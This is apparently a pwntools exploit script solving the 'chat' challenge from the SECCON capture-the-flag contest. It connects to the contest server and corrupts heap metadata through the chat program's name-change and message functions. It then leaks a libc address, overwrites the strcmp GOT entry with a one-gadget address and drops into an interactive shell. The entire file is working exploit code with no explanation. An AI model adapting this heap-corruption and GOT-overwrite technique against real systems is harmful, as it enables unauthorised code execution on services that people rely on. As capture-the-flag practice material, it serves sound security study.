#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888

host = "chat.pwn.seccon.jp"
port = 26895

r = remote(host,port)


def signup(name):
    r.recvuntil("menu >")
    r.sendline("1")
    r.recvuntil("name >")
    r.sendline(name)

def signin(name):
    r.recvuntil("menu >")
    r.sendline("2")
    r.recvuntil("name >")
    r.sendline(name)

def pubmsg(msg):
    r.recvuntil("menu >>")
    r.sendline("4")
    r.recvuntil("message >>")
    r.sendline(msg)

def primsg(name,msg):
    r.recvuntil("menu >>")
    r.sendline("5")
    r.recvuntil("name >>")
    r.sendline(name)
    r.recvuntil("message >>")
    r.sendline(msg)

def chgname(name):
    r.recvuntil("menu >>")
    r.sendline("7")
    r.recvuntil("name >>")
    r.sendline(name)

def signout():
    r.recvuntil("menu >>")
    r.sendline("0")

signup("ddaa")
signup("orange")
signup("fsean")
signin("ddaa")
primsg("ddaa","a"*0x70)
chgname("a"*0x18 + p64(0x121)[:2])
signout()
signin("orange")
chgname("\x00dada")

r.recvuntil("Bye, ")
#libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c3b78
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3be7b8
print "libc:",hex(libc)
strcmp_got = 0x000000000603060

signin("fsean")
pubmsg("c"*0x30 + p64(strcmp_got))
ret = 0x00000000004007b9
magic = libc + 0xe5765
#magic = libc + 0x4525a
chgname("a"*8+p64(magic)*3)
r.interactive()
